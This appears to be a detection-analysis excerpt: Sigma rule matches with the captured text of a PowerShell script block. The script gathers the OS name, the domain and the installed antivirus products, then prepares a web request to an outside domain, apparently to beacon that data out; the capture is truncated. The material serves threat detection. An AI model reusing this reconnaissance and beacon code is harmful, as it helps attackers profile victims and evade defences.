sigma_analysis_results.rule_title: Suspicious File Creation In Uncommon AppData Folder
sigma_analysis_results.rule_description: Detects the creation of suspicious files and folders inside the user's AppData folder but not inside any of the common and well known directories (Local, Romaing, LocalLow). This method could be used as a method to bypass detection who exclude the AppData folder in fear of FPs

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values:
@{ScriptBlockText=
    $osCaption = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    $urlEncodedOsCaption = [System.Net.WebUtility]::UrlEncode($osCaption)
    $domain = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Domain
    $AV = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $dis = $AV | ForEach-Object {
        $_.displayName
    }
    $Names = $dis -join ", "
    $webClient = New-Object Net.WebClient
    $url = "https://aldebaran30500.space/ [TRUNCATED]; Path=; ScriptBlockId=c21c42c9-9142-46d5-9dfe-04b048416452; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description:
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.
This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox
